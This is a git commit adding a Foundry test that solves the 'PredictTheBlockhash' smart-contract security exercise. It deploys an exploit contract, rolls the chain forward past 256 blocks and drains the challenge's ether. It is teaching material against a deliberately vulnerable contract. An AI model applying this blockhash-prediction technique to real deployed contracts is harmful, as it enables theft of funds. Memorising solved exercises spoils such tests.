832bf8af7a9b173adbc7ce575223fdc2a4f82ba6
Walker Ford <walker.ford@protocol.ai>
2024-04-08 12:04:49 -0600

    Solved PredictTheBlockhash

---
+++ test/week8-9-security/PredictTheBlockhash.t.sol
@@ -0,0 +1,41 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+
+import "week8-9-security/PredictTheBlockhash.sol";
+
+contract PredictTheBlockhashTest is Test {
+    PredictTheBlockhash public predictTheBlockhash;
+    ExploitContract public exploitContract;
+
+    function setUp() public {
+        // Deploy contracts
+        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
+        exploitContract = new ExploitContract(predictTheBlockhash);
+    }
+
+    function testExploit() public {
+        // Set block number
+        uint256 blockNumber = block.number;
+        // To roll forward, add the number of blocks to blockNumber,
+        // Eg. roll forward 10 blocks: blockNumber + 10
+        vm.roll(blockNumber + 10);
+
+        // Put your solution here
+        exploitContract.setup{value: 1 ether}();
+
+        // Wait for blockchain to progress 257 blocks past the locked-in block
+        vm.roll(block.number + 1 + 257);
+        exploitContract.exploit();
+
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
+    }
+
+    receive() external payable {}
+}
